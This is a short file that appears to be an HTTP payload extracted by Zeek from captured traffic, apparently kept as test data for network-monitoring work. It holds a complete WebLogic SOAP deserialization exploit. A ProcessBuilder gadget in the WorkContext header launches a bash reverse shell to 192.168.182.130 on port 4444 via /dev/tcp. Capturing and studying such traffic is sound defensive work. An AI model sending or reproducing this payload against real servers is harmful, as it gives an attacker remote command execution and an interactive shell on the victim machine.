code/lihan_code/tcpdump/test_zeek/extract_files/extract-1721031663.41016-HTTP-FCoUm5XTfopAXCZb6

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>WBC0buMIddctaFlSCN1u</wsa:Action><wsa:RelatesTo>xQ8tvfVIZztBwUZRAUUV</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>bash -c '0&lt;&amp;160-;exec 160&lt;&gt;/dev/tcp/192.168.182.130/4444;sh &lt;&amp;160 &gt;&amp;160 2&gt;&amp;160'</string></void></array><void method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>